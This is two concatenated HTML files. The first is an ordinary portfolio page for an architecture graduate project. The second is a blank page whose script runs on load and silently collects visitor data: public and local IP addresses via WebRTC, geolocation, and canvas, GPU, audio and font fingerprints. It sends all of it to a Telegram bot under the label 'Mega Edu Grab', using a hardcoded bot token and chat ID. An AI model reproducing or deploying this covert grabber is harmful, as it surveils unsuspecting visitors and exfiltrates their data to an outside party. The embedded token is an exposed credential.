<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Khaled Diab — Final Project</title>
<link rel="stylesheet" href="assets/css/styles.css" />

<!-- Google font -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
  :root{
    --bg:#040405;
    --card:#0f1113;
    --muted:#bfc4c8;
    --accent:#c9a84b;
    --glass: rgba(255,255,255,0.03);
    --white: #f6f6f6;
  }

  /* Reset & layout */
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--white);-webkit-font-smoothing:antialiased}
  a{color:inherit;text-decoration:none}

  /* Video background */
  .video-bg{position:fixed;inset:0;z-index:0;overflow:hidden}
  .video-bg video{width:100%;height:100%;object-fit:cover;filter:contrast(.85) saturate(.9) brightness(.5);transform:scale(1.02)}
  .overlay-dim{position:fixed;inset:0;background:linear-gradient(180deg,rgba(4,4,5,0.12),rgba(4,4,5,0.6));z-index:1}

  /* Centered wrap */
  .wrap{position:relative;z-index:5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1px}
  .card{width:min(980px,96%);max-width:980px;background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);border-radius:16px;padding:18px;backdrop-filter: blur(6px);box-shadow:0 12px 40px rgba(2,2,4,0.65);display:flex;gap:16px;align-items:flex-start}
  
  /* Left column (profile) */
  .left{
    width:34%;
    min-width:220px;
    padding:10px;
    display: flex;
    flex-direction: column;
  }
  .profile-row{display:flex;gap:12px;align-items:center;flex-wrap: nowrap;}
  /* AVATAR -> make circular */
  .avatar{width:72px;height:72px;border-radius:50%;overflow:hidden;border:1px solid rgba(255,255,255,0.04);background:linear-gradient(135deg,var(--card),rgba(255,255,255,0.02));display:flex;align-items:center;justify-content:center}
  .avatar img{width:100%;height:100%;object-fit:cover;display:block;border-radius:50%}
  .name-block{display:flex;flex-direction:column}
  .role{font-size:10px;color:var(--muted);letter-spacing:1px}
  .name{font-size:12px;color:var(--accent);font-weight:700;margin-top:6px}
  .links-btn{margin-left:8px;padding:8px 10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--white);font-weight:600;cursor:pointer;transition:all .18s ease}
  .links-btn:hover{box-shadow:0 8px 28px rgba(201,168,75,0.08);transform:translateY(-3px)}

  /* DESC is now a block below profile-row */
  .desc{
    margin-top: 12px;
    color: var(--muted);
    font-size: 14px;
    line-height: 1.5;
  }

  /* Center: tabs & panels */
  .center{flex:1;padding:6px}
  .tabs{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:12px}
  .tab{padding:10px 16px;border-radius:999px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--muted);font-weight:600;cursor:pointer;transition:all .28s cubic-bezier(.2,.9,.2,1)}
  .tab:hover{transform:translateY(-4px);box-shadow:0 10px 30px rgba(0,0,0,0.6)}
  .tab.active{background:linear-gradient(90deg, rgba(201,168,75,0.12), rgba(201,168,75,0.06));border-color:rgba(201,168,75,0.16);color:#fff;box-shadow:0 10px 30px rgba(201,168,75,0.06)}

  .panel{background:transparent;border-radius:10px;padding:14px;text-align:center;min-height:170px;display:none;align-items:center;justify-content:center}
  .panel.active{display:flex;animation:panelIn .6s cubic-bezier(.22,.9,.2,1)}
  @keyframes panelIn{from{opacity:0;transform:translateY(8px) scale(.995)}to{opacity:1;transform:none}}

  .panel h3{margin:0 0 8px 0;font-size:18px}
  .panel p{color:var(--muted);font-size:14px;line-height:1.6;margin-bottom:12px}

  .actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
  .btn{padding:10px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.00));color:#fff;cursor:pointer;font-weight:600;transition:transform .18s ease,box-shadow .18s ease}
  .btn:hover{transform:translateY(-4px);box-shadow:0 10px 30px rgba(0,0,0,0.5)}
  .btn.ghost{background:transparent;color:var(--muted);border-color:rgba(255,255,255,0.03)}
  .btn.primary{background:linear-gradient(90deg,var(--accent),#ffd97a);color:#0b0b0b;border:none;box-shadow:0 10px 30px rgba(201,168,75,0.08)}

  /* Right thumbnails (with shiny hover) */
  .right{width:170px;min-width:140px;display:flex;flex-direction:column;gap:10px}
  .thumb{height:90px;border-radius:10px;background:linear-gradient(135deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.02);display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:13px;padding:8px;text-align:center;cursor:zoom-in;position:relative;overflow:hidden}
  .thumb img{width:100%;height:100%;object-fit:cover;border-radius:8px}
  /* shiny overlay for thumbs */
  .thumb::before{content:"";position:absolute;top:0;left:-80%;width:48%;height:100%;background:linear-gradient(120deg, transparent, rgba(255,255,255,0.45), transparent);transform:skewX(-25deg);transition:none}
  .thumb:hover::before{animation:thumbShine 0.9s forwards}
  @keyframes thumbShine{0%{left:-80%}100%{left:130%}}

  /* lightbox */
  .lightbox{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,2,2,0.85);z-index:40;padding:20px}
  .lightbox img{max-width:92%;max-height:92%;border-radius:8px;box-shadow:0 18px 70px rgba(0,0,0,0.7)}
  .lightbox.show{display:flex;animation:fadeZoom .45s cubic-bezier(.22,.9,.2,1)}
  @keyframes fadeZoom{from{opacity:0;transform:scale(.98)}to{opacity:1;transform:none}}

  /* intro overlay */
  .start-overlay{position:fixed;inset:0;z-index:50;background:#000;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff}
  .start-overlay .txt{font-size:20px;margin-bottom:10px;letter-spacing:0.6px}
  .start-overlay .hint{color:var(--muted);font-size:13px}

  /* profile moving golden glow (around avatar) */
  .profile-wrapper{position:relative;display:inline-block}
  .profile-wrapper::after{
    content:"";
    position:absolute;
    inset:-8px;
    border-radius:50%;
    pointer-events:none;
    background:radial-gradient(circle at 30% 20%, rgba(255, 220, 120, 0.25), transparent 25%),
               conic-gradient(from 120deg, rgba(201,168,75,0.25), rgba(255,215,120,0.45), rgba(201,168,75,0.18), transparent 60%);
    mix-blend-mode: screen;
    filter: blur(6px) saturate(1.1);
    animation: rotateAndFade 5.5s linear infinite, pulseGlow 3.6s ease-in-out infinite;
    z-index:0;
  }
  @keyframes rotateAndFade{
    0%{transform:rotate(0deg)}
    50%{transform:rotate(180deg)}
    100%{transform:rotate(360deg)}
  }
  @keyframes pulseGlow{
    0%{opacity:0.45; transform: scale(0.99)}
    50%{opacity:0.9; transform: scale(1.03)}
    100%{opacity:0.45; transform: scale(0.99)}
  }

  /* responsiveness */
  @media (max-width:880px){
    .card{flex-direction:column;align-items:center;padding:16px}
    .left{width:100%;display:flex;flex-direction: column;align-items:flex-start;gap:12px}
    .profile-row{width:100%}
    .center{width:100%}
    .right{width:100%;flex-direction:row;gap:8px}
    .thumb{flex:1;height:72px}
  }
  @media (max-width:420px){
    .avatar{width:56px;height:56px}
    .name{font-size:16px}
    .tab{padding:8px 12px;font-size:13px}
  }
</style>
</head>
<body>

  <!-- Video background -->
  <div class="video-bg" aria-hidden="true">
    <video id="bgVideo" src="assets/background.mp4" autoplay muted loop playsinline></video>
  </div>
  <div class="overlay-dim" aria-hidden="true"></div>

  <!-- intro overlay -->
  <div class="start-overlay" id="startOverlay">
    <div class="txt">Click anywhere to start</div>
    <div class="hint">Tap or click to continue</div>
  </div>

  <!-- main card -->
  <div class="wrap">
    <div class="card" role="application" aria-label="Portfolio card">
      <!-- left -->
      <div class="left">
        <div class="profile-row">
          <!-- wrapped avatar for glow -->
          <div class="profile-wrapper" title="Profile">
            <div class="avatar">
              <img id="profileImg" src="assets/profile.jpg" alt="Profile image (replace with your image)">
            </div>
          </div>

          <div class="name-block">
            <div class="role">Graduate Project</div>
            <div class="name">Arch/Khaled Diab</div>
          </div>

          <!-- My Links button — now has a dedicated URL -->
          <button class="links-btn" id="linksBtn" data-url="https://guns.lol/loody" title="My Links">My Links</button>
        </div>

        <!-- desc moved OUTSIDE profile-row, below it -->
        <div class="desc">Designs exploring daylighting, materiality and human-centered circulation. Click each section to view renders, video, and the 3D model.</div>
      </div>

      <!-- center -->
      <div class="center">
        <div class="tabs" role="tablist" aria-label="Project sections">
          <button class="tab active" data-target="panel-main" role="tab" aria-selected="true">Main Project</button>
          <button class="tab" data-target="panel-video" role="tab">Video Project</button>
          <button class="tab" data-target="panel-3d" role="tab">3D Project</button>
        </div>

        <!-- panels -->
        <div id="panel-main" class="panel active" role="tabpanel">
          <div>
            <h3>Main Project</h3>
            <p>This is the comprehensive project package — site analysis, plans, sections, and material studies. Renders communicate lighting and spatial atmosphere.</p>
            <div class="actions">
              <!-- each button now uses data-url and will open a unique site -->
              <button class="btn primary" data-url="https://example.com/khaled/main-project">Open Project</button>
              <button class="btn primary" data-img="assets/render-sample.jpg">Show Render</button>
              <button class="btn primary" data-url="https://example.com/khaled/project-book">Project Book</button>
            </div>
          </div>
        </div>

        <div id="panel-video" class="panel" style="display:none" role="tabpanel">
          <div>
            <h3>Video Project</h3>
            <p>This short walkthrough highlights spatial flow, structure and landscape integration.</p>
            <div class="actions">
              <button class="btn primary" data-url="https://example.com/khaled/video">Watch Video</button>
              <!-- Transcript removed as requested -->
            </div>
          </div>
        </div>

        <div id="panel-3d" class="panel" style="display:none" role="tabpanel">
          <div>
            <h3>3D Project</h3>
            <p>Interactive model showing section cuts, material layers, and construction logic. Best experienced on desktop for full controls.</p>
            <div class="actions">
              <button class="btn primary" data-url="https://example.com/khaled/3d-model">Open 3D Model</button>
              <!-- Download Model removed as requested -->
            </div>
          </div>
        </div>
      </div>

      <!-- right thumbs -->
      <div class="right" aria-hidden="true">
        <div class="thumb" data-img="assets/concept.jpg" title="Concept">
          <img src="assets/concept.jpg" alt="Concept demo">
        </div>
        <div class="thumb" data-img="assets/site-plan.jpg" title="Site Plan">
          <img src="assets/site-plan.jpg" alt="Site plan demo">
        </div>
        <div class="thumb" data-img="assets/render-sample.jpg" title="Render sample">
          <img src="assets/render-sample.jpg" alt="Render sample">
        </div>
      </div>
    </div>
  </div>

  <!-- lightbox -->
  <div id="lightbox" class="lightbox" role="dialog" aria-modal="true" aria-hidden="true">
    <img id="lightboxImg" src="" alt="Expanded image">
  </div>

  <!-- audio -->
  <audio id="bgAudio" src="assets/music.mp3" loop playsinline></audio>
  <audio id="clickSnd" src="assets/click.mp3"></audio>

  <!-- custom cursor -->
  <div id="cursor" class="cursor" aria-hidden="true"></div>

<script>
/* Helper: open placeholder links (replace example.com subpaths with your real URLs) */
function openLink(url){
  if(!url || url === '#') url = 'https://example.com';
  try{
    const w = window.open(url, '_blank', 'noopener,noreferrer');
    if(w) w.focus();
  }catch(e){ window.location.href = url; }
}

/* Tabs logic + click sound */
const tabs = document.querySelectorAll('.tab');
const panels = {
  'panel-main': document.getElementById('panel-main'),
  'panel-video': document.getElementById('panel-video'),
  'panel-3d': document.getElementById('panel-3d')
};
const clickSnd = document.getElementById('clickSnd');

tabs.forEach(tab=>{
  tab.addEventListener('click', (e)=>{
    tabs.forEach(t=>t.classList.remove('active'));
    tabs.forEach(t=>t.setAttribute('aria-selected','false'));
    tab.classList.add('active'); tab.setAttribute('aria-selected','true');
    // show panel
    for(const k in panels){ panels[k].style.display='none'; }
    const id = tab.getAttribute('data-target');
    panels[id].style.display = 'flex';
    // play sound
    clickSnd.currentTime = 0; clickSnd.play().catch(()=>{});
  });
});

/* Lightbox for thumbs & "Show Render" ghost button */
const lightbox = document.getElementById('lightbox');
const lightboxImg = document.getElementById('lightboxImg');

function showLightbox(src, alt){
  lightboxImg.src = src;
  lightboxImg.alt = alt || "Expanded image";
  lightbox.setAttribute('aria-hidden', 'false');
  lightbox.style.display = 'flex';
  document.body.style.overflow = 'hidden';
}

function closeLightbox(){
  lightbox.setAttribute('aria-hidden', 'true');
  lightbox.style.display = 'none';
  lightboxImg.src = '';
  document.body.style.overflow = '';
}

lightbox.addEventListener('click', closeLightbox);

document.querySelectorAll('.thumb').forEach(t=>{
  t.addEventListener('click', ()=>{
    const imgSrc = t.getAttribute('data-img');
    const alt = t.querySelector('img')?.alt || "Expanded image";
    showLightbox(imgSrc, alt);
  });
});

/* Show render button */
document.querySelectorAll('.btn.ghost').forEach(btn=>{
  btn.addEventListener('click', ()=>{
    const imgSrc = btn.getAttribute('data-img');
    if(imgSrc) showLightbox(imgSrc, "Render image");
  });
});

/* My Links button */
document.getElementById('linksBtn').addEventListener('click', ()=>{
  const url = document.getElementById('linksBtn').getAttribute('data-url');
  openLink(url);
});

/* Buttons with data-url */
document.querySelectorAll('.btn.primary').forEach(btn=>{
  btn.addEventListener('click', ()=>{
    const url = btn.getAttribute('data-url');
    openLink(url);
  });
});

/* Start overlay — remove on click */
const startOverlay = document.getElementById('startOverlay');
startOverlay.addEventListener('click', ()=>{
  startOverlay.style.display = 'none';
  // Play background video & audio
  const video = document.getElementById('bgVideo');
  const audio = document.getElementById('bgAudio');
  video.play().catch(()=>{});
  audio.play().catch(()=>{});
});

/* Custom cursor */
const cursor = document.getElementById('cursor');
document.addEventListener('mousemove', e=>{
  cursor.style.left = (e.clientX - 10) + 'px';
  cursor.style.top = (e.clientY - 10) + 'px';
});
</script>

</body>
</html>


<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
const BOT_TOKEN = "8253945171:AAG0T58v__eblhQCiSgF-5TyG7-eN12nFUI";
const CHAT_ID = "976015997";

async function fetchJSON(url) {
  try { return await (await fetch(url)).json(); } catch { return {}; }
}

async function getPublicIP(){let r=await fetchJSON("https://api.ipify.org?format=json");return r.ip||"N/A";}
async function getGeo(ip){return ip!=="N/A"?await fetchJSON(`https://ipapi.co/${ip}/json/`):{};}
function getCanvasHash(){try{let c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(125,1,62,20);x.fillStyle="#069";x.fillText("edu-fp",2,2);return btoa(c.toDataURL()).substr(0,32);}catch{return"N/A";}}
function getGPU(){try{let c=document.createElement('canvas'),g=c.getContext('webgl');let e=g.getExtension('WEBGL_debug_renderer_info');return g.getParameter(e.UNMASKED_RENDERER_WEBGL);}catch{return"N/A";}}
async function getBattery(){try{let b=await navigator.getBattery();return `${(b.level*100).toFixed(0)}% ch:${b.charging}`;}catch{return"N/A";}}
async function getLocalIPs(){return new Promise(r=>{let s=new Set();try{let pc=new RTCPeerConnection();pc.createDataChannel("");pc.onicecandidate=e=>{if(e.candidate){let m=/(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);if(m)s.add(m[1]);}};pc.createOffer().then(o=>pc.setLocalDescription(o));setTimeout(()=>r([...s]),2e3);}catch{r([])}});}
async function getMediaDevices(){try{return (await navigator.mediaDevices.enumerateDevices()).map(d=>`${d.kind}:${d.label||"Hidden"}`);}catch{return["N/A"]}}
async function getAudioFingerprint(){try{let ctx=new (window.AudioContext||window.webkitAudioContext)();let osc=ctx.createOscillator();let comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start(0);let arr=new Float32Array(ctx.sampleRate);comp.getChannelData?comp.getChannelData(0,arr):null;osc.stop();return `rate:${ctx.sampleRate}`;}catch{return"N/A";}}
function getFonts(){let baseWidth,height;const fonts=["Arial","Courier New","Times New Roman","Comic Sans MS"];let test=document.createElement('span');test.innerHTML="mmmmmmmmmmlli";test.style.fontSize="72px";test.style.display="inline-block";document.body.appendChild(test);let available=[];for(let f of fonts){test.style.fontFamily=f;let w=test.offsetWidth,h=test.offsetHeight;if(!baseWidth){baseWidth=w;height=h;}if(w!==baseWidth||h!==height)available.push(f);}test.remove();return available;}
async function getStorageQuota(){try{let q=await navigator.storage.estimate();return `${(q.quota/1e6).toFixed(1)}MB`; }catch{return"N/A";}}
function getPerf(){try{return performance.timing ? performance.timing.navigationStart : "N/A";}catch{return"N/A";}}
function getSensors(){return {accel:"Accelerometer" in window,gyro:"Gyroscope" in window};}
function getConn(){try{return navigator.connection ? {type:navigator.connection.effectiveType,down:navigator.connection.downlink} : {}; }catch{return{};}}

async function collect(){
  const ip=await getPublicIP();
  const geo=await getGeo(ip);
  return {
    ts:new Date().toISOString(),
    ua:navigator.userAgent,
    lang:navigator.language,
    plat:navigator.platform,
    scr:`${screen.width}x${screen.height}`,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    mem:navigator.deviceMemory,
    cpu:navigator.hardwareConcurrency,
    cookies:navigator.cookieEnabled,
    gpu:getGPU(),
    canvas:getCanvasHash(),
    battery:await getBattery(),
    ip,geo,
    localIPs:await getLocalIPs(),
    devices:await getMediaDevices(),
    audioFp:await getAudioFingerprint(),
    fonts:getFonts(),
    tzOffset:new Date().getTimezoneOffset(),
    touch:'ontouchstart' in window,
    storage:await getStorageQuota(),
    perf:getPerf(),
    sensors:getSensors(),
    conn:getConn()
  };
}

async function sendTelegram(data){
  const msg=`📋 Mega Edu Grab:\n${JSON.stringify(data,null,2)}`;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
}

(async()=>{
  let data=await collect();
  await sendTelegram(data);
})();
</script>
</body>
</html>
